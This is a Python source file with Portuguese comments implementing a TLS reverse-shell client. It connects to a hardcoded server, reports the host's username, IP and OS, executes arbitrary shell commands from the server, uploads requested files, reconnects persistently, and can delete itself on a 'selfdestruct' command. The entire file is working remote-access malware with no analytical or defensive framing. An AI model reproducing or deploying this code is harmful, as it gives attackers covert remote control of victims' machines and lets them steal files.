import socket
import ssl
import os
import subprocess
import time
import json
import platform
import getpass

os.system('clear')

# Configurações do cliente
SERVER_HOST = '192.168.247.28'
SERVER_PORT = 7070
# Caminho para o certificado do servidor (usado para verificação)
CERT_FILE = 'server.crt'
def collect_info():
    info = {
        'id': 'unique_client_id',  
        'access_level': 'user',    
        'ip': socket.gethostbyname(socket.gethostname()),
        'username': getpass.getuser(),
        'os_version': platform.platform(),
    }
    return info
def send_info_to_server(client_socket, info):
    info_json = json.dumps(info)
    client_socket.sendall(info_json.encode())

def connect_to_server():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Envolver o socket com SSL
    client_socket = ssl.wrap_socket(client_socket, ca_certs=CERT_FILE, cert_reqs=ssl.CERT_REQUIRED)

    while True:
        try:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print(f'Conectado ao servidor {SERVER_HOST}:{SERVER_PORT} (SSL)')

            client_info = collect_info()
            send_info_to_server(client_socket, client_info)

            current_dir = os.getcwd()

            while True:
                comando = client_socket.recv(4096).decode().strip()
                if comando.lower() == 'exit':
                    exit()
                elif comando.startswith('file:'):
                    _, file_path = comando.split(':', 1)
                    file_path = file_path.strip()
                    send_file(client_socket, file_path)
                elif comando.startswith('cd '):
                    try:
                        new_dir = comando.split(' ', 1)[1].strip()
                        os.chdir(new_dir)
                        current_dir = os.getcwd()
                        client_socket.sendall(f"Diretório alterado para: {current_dir}".encode())
                    except FileNotFoundError:
                        client_socket.sendall(f"Diretório {new_dir} não encontrado.".encode())
                    except Exception as e:
                        client_socket.sendall(f"Erro ao mudar diretório: {str(e)}".encode())
                elif comando == 'selfdestruct':
                    self_destruct(client_socket)
                    break
                else:
                    resultado = subprocess.run(comando, shell=True, capture_output=True, text=True, cwd=current_dir)
                    if resultado.returncode == 0:
                        output = resultado.stdout
                    else:
                        output = resultado.stderr
                    client_socket.sendall(output.encode())

        except ConnectionRefusedError:
            print('Tentando se reconectar...')
            time.sleep(5)
        except Exception as e:
            print(f"Erro inesperado: {e}")
            time.sleep(5)

def send_file(client_socket, file_path):
    if os.path.exists(file_path):
        try:
            with open(file_path, 'rb') as f:
                client_socket.sendall(f.read())
            print(f"Arquivo {file_path} enviado.")
        except Exception as e:
            print(f"Erro ao enviar o arquivo: {e}")
            client_socket.sendall(f"Erro ao enviar o arquivo: {e}".encode())
    else:
        print(f"Arquivo {file_path} não encontrado.")
        client_socket.sendall(f"Arquivo {file_path} não encontrado.".encode())

def self_destruct(client_socket):
    print("Auto-destruição iniciada.")
    client_socket.sendall("selfdestruct".encode())
    client_socket.close()
    os.remove(__file__)

if __name__ == "__main__":
    connect_to_server()
